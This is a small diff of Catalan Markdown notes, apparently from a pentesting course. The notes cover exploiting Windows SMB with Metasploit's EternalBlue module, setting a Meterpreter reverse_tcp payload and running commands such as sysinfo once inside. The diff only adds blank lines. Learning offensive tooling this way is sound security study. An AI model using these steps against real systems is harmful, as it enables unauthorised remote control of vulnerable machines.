@@ -10,7 +10,9 @@
 `use exploit/windows/smb/ms17_010_eternalblue`...i ens torna el control mitjançant un **shell o un Meterpreter** (Metainterprete:payload que permet carregar i injectar en un programa del sistema atacat les extensions que em desenvolupat en format .dll). 
 
 * i payload `set PAYLOAD windows/x64/meterpreter/reverse_tcp`
+
 Ja estem dins...
+
 * Comandaments:
     * sysinfo
     * pwd
